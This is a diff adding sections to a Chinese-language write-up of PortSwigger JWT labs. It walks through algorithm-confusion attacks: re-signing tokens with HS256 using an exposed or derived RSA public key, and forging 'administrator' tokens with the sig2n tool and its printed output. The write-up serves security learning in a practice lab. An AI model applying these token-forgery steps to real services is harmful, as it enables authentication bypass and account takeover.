@@ -371,6 +371,103 @@ console.log(decodeResult);
 
 一樣，把 token 塞回 cookie，成功解題～
 
+## Other interesting JWT header parameters
+
+- cty
+- x5c
+
+## Lab: JWT authentication bypass via algorithm confusion
+
+| Dimension | Description                                                                                                        |
+| --------- | ------------------------------------------------------------------------------------------------------------------ |
+| Document  | https://portswigger.net/web-security/jwt/algorithm-confusion#how-do-algorithm-confusion-vulnerabilities-arise      |
+| Lab       | https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion |
+
+訪問 /jwks.json
+
+```json
+{
+  "keys": [
+    {
+      "kty": "RSA",
+      "e": "AQAB",
+      "use": "sig",
+      "kid": "b8122222-5caa-482c-9ee5-27faa2ae980f",
+      "alg": "RS256",
+      "n": "ohuCvfgHgrJQeVi2CpeDQPfIHD2Sdw6_M3elhIeqNG-bTAX0a9VDNUZ9U_biK-gsdQ4DMRZbwnUKC5c8wI4SlTv2jXunYrMEIeeaxli-L9tCKsXga1bT0cNKEVmGIy3OqFnj47DYO-n4MII3sAeM7dmDwLLr-nsl-uT68QSrM9FywZRuTTsLT-QPylE16rO8R2S1kooqXitkfOdflt8_kZHHD_CzVhOkMj4gCUmpfDnjhX8TZaqmAAxrDTaHqdmHN0jVT9vmxXOagebCbCr2Xiq9R_Gvt40ZjhT6Gs3nfnaivt9MvCjLgpPdzAsNhIooTCOtba_sgnjHoZF8OVw6qQ"
+    }
+  ]
+}
+```
+
+照著 [Step 2 - Convert the public key to a suitable format](https://portswigger.net/web-security/jwt/algorithm-confusion#step-2-convert-the-public-key-to-a-suitable-format) 的方法走一遍
+
+把這坨東西拿去簽
+
+```json
+// header
+{
+    "kid": "b8122222-5caa-482c-9ee5-27faa2ae980f",
+    "typ": "JWT",
+    "alg": "HS256"
+}
+// payload
+{
+    "iss": "portswigger",
+    "exp": 1761625021,
+    "sub": "administrator"
+}
+```
+
+之後把 token 塞回 cookie，成功解題～
+
+<!-- todo-yus 不懂為啥 portSwigger 要八個步驟 -->
+
+## Lab: JWT authentication bypass via algorithm confusion with no exposed key
+
+| Dimension | Description                                                                                                                            |
+| --------- | -------------------------------------------------------------------------------------------------------------------------------------- |
+| Document  | https://portswigger.net/web-security/jwt/algorithm-confusion#deriving-public-keys-from-existing-tokens                                 |
+| Lab       | https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion-with-no-exposed-key |
+
+這題也沒啥難度，就是照著 PortSwigger Document 跑一次
+
+嘗試登入兩次，會取得兩個 jwt，然後跑
+
+```
+docker run --rm -it portswigger/sig2n <token1> <token2>
+```
+
+會看到以下輸出
+
+```
+Found n with multiplier 1:
+    Base64 encoded x509 key: LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEzZjhqTXl6NWtNb2svc0VKMUtabgpGbEN3ZEVOM2w1bjF1TC9OTlNudnpsb1ZkS3BwQ0VFdDdvdnlKRmtwb1N6bnNLenVSR0VZcGM0TFpDQ0psNVYwClNja0VCUUFCVGNNUDgvY3JJL2gzalBtWmFrK0NLbG9nQjcrL3phMWNVNFZTcU5UNkxWcGtuT09LTVhyVW1VdnQKR1gzNmJTS21rM2NGdjNRVlNaWm42R0piYlFCVG5HVy8wbkxvUmdhOEZlK0liNWpkRHVyWGhWNkRVWlMyZHVWOAp5VjRGTU9wS0R5TUZ3cjRiN0NhV0R3ZWtDK0RmWFV2T1R3NnZWTUNzcjdnNEZYMUtRUC9hbkc2TUZxNFl1aDZtClpldC9PcFNBeFQ3YitTTllrYWo3UDJ1elRFVEpYYWdxaDFlblVhQ2N6M1dZRDRxUkVxOHRoVm54QWhWUHFJRUYKMXdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==
+    Tampered JWT: eyJraWQiOiI1NzE0Yzc0MS1iOTIzLTRiN2UtOWY1MC1hOGVlODVjMzQ1YjUiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiAicG9ydHN3aWdnZXIiLCAiZXhwIjogMTc2MTcxODY3MiwgInN1YiI6ICJ3aWVuZXIifQ.fG-SJ1h9vjXS-bL6KPGFs6ERLdteu9_O3l_DgQInpbU
+```
+
+拿 Tampered JWT 塞回 cookie，確定可以保持 wiener 登入的狀態，token 解出來是
+
+```json
+// header
+{
+  "kid": "5714c741-b923-4b7e-9f50-a8ee85c345b5",
+  "alg": "HS256"
+}
+// payload
+{
+  "iss": "portswigger",
+  "exp": 1761718672,
+  "sub": "wiener"
+}
+```
+
+之後把 sub 改成 administrator，然後照著 [Step 2 - Convert the public key to a suitable format](https://portswigger.net/web-security/jwt/algorithm-confusion#step-2-convert-the-public-key-to-a-suitable-format) 從第五步驟步驟開始跑，kid 用跟原本一樣的，就可以成功通關了～
+
+## 小結
+
+這系列的 Labs 也是讓我對 jwt 從入門到略懂，希望未來可以在真實世界找到 jwt 的漏洞～
+
 ## 參考資料
 
 - https://portswigger.net/web-security/jwt
